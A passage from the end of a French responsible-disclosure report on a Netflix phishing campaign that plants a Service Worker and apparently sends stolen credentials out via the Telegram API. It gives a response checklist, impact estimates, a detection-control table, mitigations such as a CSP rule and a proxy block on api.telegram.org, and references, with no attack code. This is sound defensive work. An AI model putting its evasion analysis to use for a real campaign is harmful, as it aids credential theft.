PHASE 2 — IDENTIFICATION (< 30 minutes)
────────────────────────────────────────
  □ Ouvrir les DevTools (F12) → Onglet "Application"
  □ Vérifier "Service Workers" → Documenter scope, scriptURL, état
  □ Vérifier "Cache Storage" → Chercher "netflix-cache-v1" ou similaire
  □ Vérifier "Local Storage" → Chercher victim_id, bot_token, sw_installed
  □ Vérifier "Cookies" → Chercher victim_id, sw_active
  □ Onglet "Network" → Filtrer par "telegram.org" → Documenter les requêtes
  □ Prendre des captures d'écran de chaque étape

PHASE 3 — ÉRADICATION (< 1 heure)
───────────────────────────────────
  □ DevTools > Application > Service Workers → Clic "Unregister" sur chaque SW
  □ DevTools > Application > Cache Storage → Supprimer tous les caches suspects
  □ DevTools > Application > Local Storage → Supprimer les clés malveillantes
  □ DevTools > Application > Cookies → Supprimer les cookies suspects
  □ Vider complètement le cache navigateur (Ctrl+Shift+Del)
  □ Vérifier qu'aucun SW n'est encore enregistré (recharger DevTools)

PHASE 4 — REMÉDIATION CREDENTIALS (< 2 heures)
────────────────────────────────────────────────
  □ Réinitialiser IMMÉDIATEMENT le mot de passe Netflix
  □ Réinitialiser le mot de passe email utilisé sur la popup
  □ Vérifier et réinitialiser tous les services utilisant les mêmes credentials
  □ Activer l'authentification à deux facteurs (2FA) partout où c'est possible
  □ Vérifier l'historique de connexion Netflix pour sessions inconnues
  □ Révoquer toutes les sessions actives sur les comptes compromis

PHASE 5 — INVESTIGATION (< 24 heures)
───────────────────────────────────────
  □ Analyser les logs proxy pour identifier la durée d'exfiltration
  □ Identifier le volume de données exfiltrées vers api.telegram.org
  □ Vérifier si d'autres postes ont visité la même URL (logs DNS/proxy)
  □ Identifier le vecteur de distribution (email, lien partagé, SEO...)
  □ Déterminer si des données bancaires ont pu être interceptées (SW actif)

PHASE 6 — DOCUMENTATION ET CLÔTURE
─────────────────────────────────────
  □ Rédiger le rapport d'incident (timeline, scope, données compromises)
  □ Notifier le DPO si des données personnelles ont été exfiltrées (RGPD)
  □ Notifier les utilisateurs concernés si nécessaire
  □ Signaler l'URL phishing à Google Safe Browsing et Microsoft SmartScreen
  □ Partager les IOC avec le CERT national
  □ Mettre à jour la base de connaissance de sécurité interne
```

---

## 12. Analyse d'Impact

### 12.1 Scalabilité de l'Attaque

```
Scénario de distribution à grande échelle :

  1 page phishing hébergée
         │
         ├──▶ Distribution par spam email (1 000 destinataires)
         │         └─ Taux de clic estimé 2-5% → 20-50 victimes
         │
         ├──▶ Référencement SEO sur requêtes "Netflix gratuit"
         │         └─ Visites organiques → 10-100/jour
         │
         └──▶ Partage sur réseaux sociaux / forums
                   └─ Viral potential → centaines de victimes

  Impact total estimé sur 30 jours :
  ┌─────────────────────────────────────────────┐
  │ Credentials Netflix volés : 50-500          │
  │ Service Workers installés : 50-500          │
  │ Données API interceptées  : illimitées      │
  │ Coût infrastructure C2    : ~0€ (Telegram)  │
  └─────────────────────────────────────────────┘
```

### 12.2 Facteurs de Difficulté de Détection

```
Contrôle de sécurité          Efficacité contre cette attaque
──────────────────────────────────────────────────────────────
Antivirus traditionnel        ❌ Inefficace (code légitime)
EDR endpoint                  ⚠️  Partiel (comportement SW)
Proxy web standard            ⚠️  Partiel (si Telegram bloqué)
WAF (Web App Firewall)        ❌ Côté client, non filtré
IDS/IPS réseau                ⚠️  Partiel (HTTPS chiffré)
Formation anti-phishing       ⚠️  Partiel (leurre convaincant)
CSP worker-src 'self'         ✅ Bloque l'installation du SW
Proxy HTTPS + TLS inspection  ✅ Peut détecter l'exfiltration
SIEM avec règles Sigma        ✅ Détecte post-infection
```

---

## 13. Conclusion

Cette recherche met en évidence que la combinaison de techniques connues — phishing, Service Worker, API légitime — produit une menace qualitativement supérieure à chacune prise séparément. La synergie crée un vecteur d'attaque :

- **Difficile à détecter** : aucune signature malware, trafic HTTPS vers domaine légitime
- **Difficile à éradiquer** : persistance multi-couches, SW survit aux redémarrages
- **Difficile à attribuer** : canal C2 via service tiers, logs Telegram non accessibles

Les **mitigations prioritaires** recommandées sont :

1. Déployer `Content-Security-Policy: worker-src 'self'` sur toutes les applications web
2. Créer une règle proxy bloquant `api.telegram.org` depuis les User-Agents navigateur
3. Déployer la règle Sigma de détection du SW Blob sur le SIEM
4. Former les utilisateurs à reconnaître les popups de "session expirée" suspectes

Ce rapport a été produit en respectant scrupuleusement l'éthique de la recherche en cybersécurité. Les credentials ont été transmis séparément aux autorités, et aucun code fonctionnel exploitable n'est publié.

---

## 14. Références

- [MITRE ATT&CK T1566.002 — Phishing](https://attack.mitre.org/techniques/T1566/002/)
- [MITRE ATT&CK T1176 — Browser Extensions / SW](https://attack.mitre.org/techniques/T1176/)
- [MITRE ATT&CK T1185 — Man in the Browser](https://attack.mitre.org/techniques/T1185/)
- [MITRE ATT&CK T1567.002 — Exfiltration vers service web](https://attack.mitre.org/techniques/T1567/002/)
- [W3C — Spécification Service Workers](https://www.w3.org/TR/service-workers/)
- [MDN — Service Worker API](https://developer.mozilla.org/fr/docs/Web/API/Service_Worker_API)
- [MDN — Content Security Policy](https://developer.mozilla.org/fr/docs/Web/HTTP/CSP)
- [OWASP — Phishing Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Phishing_Prevention_Cheat_Sheet.html)
- [FIRST — Calculateur CVSS 3.1](https://www.first.org/cvss/calculator/3.1)
- [Sigma Rules Project](https://github.com/SigmaHQ/sigma)
- [YARA Documentation](https://yara.readthedocs.io/)

---

<div align="center">

*Chercheur : **ML** — Divulgation Responsable — TLP:WHITE — Mars 2026*

</div>
